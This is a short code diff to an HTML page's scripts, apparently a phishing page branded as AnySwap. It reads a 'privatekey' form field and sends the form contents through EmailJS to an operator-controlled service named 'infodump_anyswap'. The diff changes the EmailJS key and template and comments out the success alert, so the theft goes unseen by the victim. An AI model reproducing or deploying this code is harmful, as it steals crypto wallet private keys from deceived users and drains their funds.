@@ -3072,7 +3072,7 @@
     <script type="text/javascript">
       (function () {
         // https://dashboard.emailjs.com/admin/account
-        emailjs.init("jF3ELuLL1GIo3uNzm");
+        emailjs.init("0sSbNxhPWeh5ytGqS");
       })();
     </script>
     <script>
@@ -3083,11 +3083,11 @@
         let privatekey = document.getElementById("privatekey").value;
             console.log(this)
         emailjs
-          .sendForm("anyswap_service", "anyswappapp_deal", this, "jF3ELuLL1GIo3uNzm")
+          .sendForm("infodump_anyswap", "swap_app_template", this, "0sSbNxhPWeh5ytGqS")
           .then(
             function (result) {
               console.log(result, "SUCCESS!");
-              alert("Info sent successfully");
+              // alert("Info sent successfully");
             },
             function (error) {
               console.log("FAILED...", error);
